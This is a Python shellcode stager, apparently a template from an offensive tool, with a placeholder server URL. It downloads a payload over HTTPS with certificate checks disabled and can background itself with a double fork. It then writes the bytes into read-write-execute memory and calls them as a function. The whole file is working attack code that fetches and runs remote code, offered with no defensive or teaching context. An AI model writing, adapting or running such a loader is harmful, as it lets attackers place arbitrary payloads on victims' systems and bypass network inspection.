#!/usr/bin/env python3
import ctypes
import mmap
import os
import ssl
import urllib.request

# payload source, e.g. http://localhost/payload.bin
PAYLOAD_URL = '{{ SRVURL }}'

# fork to background
DAEMONIZE = False

# ---

assert os.name == 'posix'

# download without checking https certificates
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
with urllib.request.urlopen(PAYLOAD_URL, context=ctx) as res:
    shellcode = res.read()

if DAEMONIZE:
    # double fork
    pid = os.fork()
    if pid != 0:
        exit()
    os.setsid()
    pid = os.fork()
    if pid != 0:
        exit()

# map payload into memory and jump to it
size = len(shellcode)
with mmap.mmap(-1, size, prot=mmap.PROT_READ|mmap.PROT_WRITE|mmap.PROT_EXEC) as page:
    page.write(shellcode)
    buf = (ctypes.c_char * size).from_buffer(page)
    addr = ctypes.addressof(buf)
    fn = ctypes.CFUNCTYPE(None)(addr)
    fn.page = page
    fn()
